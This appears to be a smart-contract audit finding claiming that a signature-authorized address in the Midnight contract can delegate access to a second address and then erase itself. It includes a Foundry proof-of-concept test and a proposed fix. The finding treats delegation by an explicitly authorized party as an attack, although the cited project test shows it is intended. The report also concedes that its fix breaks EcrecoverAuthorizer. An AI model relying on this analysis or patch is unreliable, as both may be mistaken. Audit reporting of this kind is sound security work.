### Title
Authorized Address Can Transitively Delegate Authorization to Arbitrary Third Parties - (`src/periphery/EcrecoverAuthorizer.sol` / `src/Midnight.sol`)

### Summary
`Midnight.setIsAuthorized` permits any currently-authorized address to grant further authorizations on behalf of the authorizer. When an attacker obtains a victim-signed `Authorization` and submits it through `EcrecoverAuthorizer.setIsAuthorized`, they gain `isAuthorized[victim][attacker] = true`. They can immediately use that status to call `Midnight.setIsAuthorized(attacker2, true, victim)`, then erase themselves with `Midnight.setIsAuthorized(attacker, false, victim)`, leaving `attacker2` with permanent unauthorized access the victim never consented to.

### Finding Description

**Code path and root cause**

`Midnight.setIsAuthorized` at line 731–735:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    ...
}
``` [1](#0-0) 

The only guard is `isAuthorized[onBehalf][msg.sender]`. There is no restriction preventing an authorized address from writing *new* entries into the same `isAuthorized[onBehalf][*]` mapping — i.e., authorization is fully delegatable by any authorized party.

`EcrecoverAuthorizer.setIsAuthorized` verifies the victim's EIP-712 signature and then calls `Midnight.setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer)`: [2](#0-1) 

The signature check at line 33–36 only verifies that the signer is the authorizer (or already authorized by them): [3](#0-2) 

**Exploit flow (exact reachable path)**

Preconditions:
- `isAuthorized[victim][EcrecoverAuthorizer] = true` (victim set this on-chain)
- Attacker holds a valid victim-signed `Authorization{authorizer=victim, authorized=attacker, isAuthorized=true, nonce=N}`

Step 1 — Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, sig)`:
- Deadline/nonce checks pass; signature verifies as victim's
- Calls `Midnight.setIsAuthorized(attacker, true, victim)`
- Guard: `isAuthorized[victim][EcrecoverAuthorizer] = true` → passes
- State: `isAuthorized[victim][attacker] = true`

Step 2 — Attacker calls `Midnight.setIsAuthorized(attacker2, true, victim)` directly:
- Guard: `isAuthorized[victim][attacker] = true` → passes
- State: `isAuthorized[victim][attacker2] = true`

Step 3 — Attacker calls `Midnight.setIsAuthorized(attacker, false, victim)` directly:
- Guard: `isAuthorized[victim][attacker] = true` (still true at call time) → passes
- State: `isAuthorized[victim][attacker] = false`

Final state: `isAuthorized[victim][attacker2] = true`, `isAuthorized[victim][attacker] = false`. The victim's signature covered only `{authorized: attacker}`, never `attacker2`.

**Why existing checks fail**

The Certora rule `onlyAuthorizedCanChangeIsAuthorized` only asserts that the caller is authorized at the time of the call: [4](#0-3) 

This is satisfied in steps 2 and 3 (attacker is authorized). The rule does not capture the invariant that the victim's *signature* bounds which addresses may be added. The `EcrecoverAuthorizer` Certora spec only checks nonce increment and revert conditions — it does not verify that the authorized address cannot further delegate: [5](#0-4) 

The test `testSetIsAuthorizedAuthorization` explicitly demonstrates that an authorized address can add further authorized addresses, confirming the path is reachable: [6](#0-5) 

### Impact Explanation

`attacker2` holds `isAuthorized[victim][attacker2] = true` permanently (until victim revokes it, which requires victim to notice). With this flag, `attacker2` can call any `onBehalf`-gated function: `withdraw`, `withdrawCollateral`, `repay`, `setConsumed`, and `setIsAuthorized` again — giving full control over victim's credit, debt, and collateral. The victim's signature only ever covered authorizing `attacker`; `attacker2` was never consented to. [7](#0-6) 

### Likelihood Explanation

Preconditions are realistic: a victim who uses `EcrecoverAuthorizer` to grant a one-time or time-limited authorization (e.g., to a relayer or keeper) necessarily satisfies both preconditions. The attacker needs only one valid signed message — which they already hold by definition of the scenario. Steps 2 and 3 are direct calls with no additional inputs. The attack is repeatable for any victim who has ever authorized `EcrecoverAuthorizer` and issued a signed authorization to any party.

### Recommendation

Restrict `Midnight.setIsAuthorized` so that only `onBehalf == msg.sender` (the authorizer themselves, not a delegate) can modify the `isAuthorized` mapping. Authorized addresses should be able to act *on behalf of* the authorizer for operational functions (withdraw, repay, etc.) but should not be able to grant or revoke authorizations for the authorizer. Concretely:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender, Unauthorized()); // only self, no delegation
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    ...
}
``` [1](#0-0) 

This does not break `EcrecoverAuthorizer` because it calls `Midnight.setIsAuthorized` with `msg.sender = EcrecoverAuthorizer` and `onBehalf = victim`; the fix would require `EcrecoverAuthorizer` to be the victim itself, which is not the case — so `EcrecoverAuthorizer` would need to be redesigned to use a separate privileged path, or the authorization model must explicitly bound what delegates can do.

### Proof of Concept

```solidity
function testAttackerDelegatesViaSignature() public {
    address victim   = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address attacker2 = makeAddr("attacker2");

    // Precondition 1: victim authorizes EcrecoverAuthorizer
    vm.prank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);

    // Precondition 2: victim signs Authorization for attacker
    Authorization memory auth = Authorization({
        authorizer:   victim,
        authorized:   attacker,
        isAuthorized: true,
        nonce:        ecrecoverAuthorizer.nonce(victim),
        deadline:     block.timestamp + 1 days
    });
    Signature memory sig = signAuthorization(auth, victim); // victim's private key

    // Step 1: attacker submits victim's signature
    vm.prank(attacker);
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);
    assertEq(midnight.isAuthorized(victim, attacker), true);

    // Step 2: attacker adds attacker2 on victim's behalf
    vm.prank(attacker);
    midnight.setIsAuthorized(attacker2, true, victim);
    assertEq(midnight.isAuthorized(victim, attacker2), true);

    // Step 3: attacker removes themselves (cover tracks)
    vm.prank(attacker);
    midnight.setIsAuthorized(attacker, false, victim);

    // Assertions: attacker2 has persistent access, attacker is gone
    assertEq(midnight.isAuthorized(victim, attacker2), true);  // PASS — unauthorized persistent access
    assertEq(midnight.isAuthorized(victim, attacker),  false); // PASS — attacker hidden
}
```

Expected: both assertions pass, confirming `attacker2` holds permanent unauthorized access to victim's account that the victim's signature never granted.

### Citations

**File:** src/Midnight.sol (L192-192)
```text
    mapping(address authorizer => mapping(address authorized => bool)) public isAuthorized;
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-48)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** certora/specs/OnlyAuthorizedCanChange.spec (L102-110)
```text
rule onlyAuthorizedCanChangeIsAuthorized(env e, method f, calldataarg args, address authorizer, address authorized) filtered { f -> !f.isView } {
    bool authorizerIsAuthorized = authorizer == e.msg.sender || isAuthorized(authorizer, e.msg.sender);

    bool isAuthorizedBefore = isAuthorized(authorizer, authorized);
    f(e, args);
    bool isAuthorizedAfter = isAuthorized(authorizer, authorized);

    assert isAuthorizedAfter == isAuthorizedBefore || authorizerIsAuthorized;
}
```

**File:** certora/specs/EcrecoverAuthorizer.spec (L11-36)
```text
/// EcrecoverAuthorizer increments nonce on success and does not change other nonces.
rule effects(env e, EcrecoverAuthorizer.Authorization authorization, EcrecoverAuthorizer.Signature signature, address other) {
    require other != authorization.authorizer;
    uint256 nonceBefore = nonce(authorization.authorizer);
    uint256 otherNonceBefore = nonce(other);

    setIsAuthorized(e, authorization, signature);

    assert nonce(authorization.authorizer) == nonceBefore + 1;
    assert nonce(other) == otherNonceBefore;
}

/// Expired deadline, wrong nonce, and nonce reused cause revert.
rule requiredConditions(env e1, env e2, EcrecoverAuthorizer.Authorization authorization, EcrecoverAuthorizer.Signature signature, EcrecoverAuthorizer.Authorization otherAuthorization, EcrecoverAuthorizer.Signature otherSignature) {
    require authorization.authorizer == otherAuthorization.authorizer;
    uint256 nonceBefore = nonce(authorization.authorizer);

    setIsAuthorized(e1, authorization, signature);

    assert e1.block.timestamp <= authorization.deadline;
    assert authorization.nonce == nonceBefore;

    setIsAuthorized(e2, otherAuthorization, otherSignature);

    assert otherAuthorization.nonce != nonceBefore;
}
```

**File:** test/AuthorizationTest.sol (L290-304)
```text
    function testSetIsAuthorizedAuthorization(address user, address authorized, address newAuthorized) public {
        vm.assume(user != authorized);

        vm.prank(authorized);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.setIsAuthorized(newAuthorized, true, user);

        vm.prank(user);
        midnight.setIsAuthorized(authorized, true, user);

        vm.prank(authorized);
        midnight.setIsAuthorized(newAuthorized, true, user);

        assertEq(midnight.isAuthorized(user, newAuthorized), true);
    }
```
